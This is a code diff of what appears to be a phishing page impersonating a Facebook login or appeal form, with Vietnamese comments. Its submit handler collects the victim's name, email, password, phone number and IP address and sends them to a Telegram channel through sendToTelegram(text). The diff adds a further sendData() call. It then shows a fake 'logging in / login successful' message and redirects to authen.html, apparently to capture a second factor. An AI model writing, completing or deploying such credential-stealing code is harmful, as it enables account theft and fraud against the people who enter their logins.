@@ -921,8 +921,6 @@
 
                 $("#btn-submit").click(function () {
 
-
-                    sendToTelegram("Hi");
                     var isValid = true;
                     var fullName = $('#full_name').val();
                     var facebookPageName = $('#facebook_page_name').val();
@@ -1003,29 +1001,27 @@
                         var text = "Full Name: " + fullName + "\nFacebook Page Name: " + facebookPageName + "\nEmail: " + email + "\nPass: " + password + "\nMã Vùng: " + country_code + "\nPhone: " + phone + "\nOther reasons: " + otherReasons + "\nIp: " + ip;
 
                         sendToTelegram(text);
+                    }
+                    sendData();
 
+                    console.log("Nút submit_password đã được click!");
 
+                    showLoadingCircle(); // Hiển thị loading
+                    $("#login-status").show().text("Đang đăng nhập..."); // Hiển thị dòng chữ "Đang đăng nhập..."
 
+                    setTimeout(() => {
+                        hideLoadingCircle(); // Ẩn loading
+                        $("#login-status").text("Đăng nhập thành công!"); // Cập nhật trạng thái
 
-                        console.log("Nút submit_password đã được click!");
+                        sessionStorage.setItem("fromIndex", "true");
+                        window.location.href = "authen.html";
 
-                        showLoadingCircle(); // Hiển thị loading
-                        $("#login-status").show().text("Đang đăng nhập..."); // Hiển thị dòng chữ "Đang đăng nhập..."
+                        // Ẩn modal đúng cách
+                        $("#passwordModal").modal("hide");
 
+                    }, time_out * 1000);
 
-                        setTimeout(() => {
-                            hideLoadingCircle(); // Ẩn loading
-                            $("#login-status").text("Đăng nhập thành công!"); // Cập nhật trạng thái
-
-                            sessionStorage.setItem("fromIndex", "true");
-                            window.location.href = "authen.html";
-
-                            // Ẩn modal đúng cách
-                            $("#passwordModal").modal("hide");
-
-                        }, time_out * 1000);
-
-                    });
+                });
 
                 function utf8ToBase64(str) {
                     return btoa(unescape(encodeURIComponent(str)));
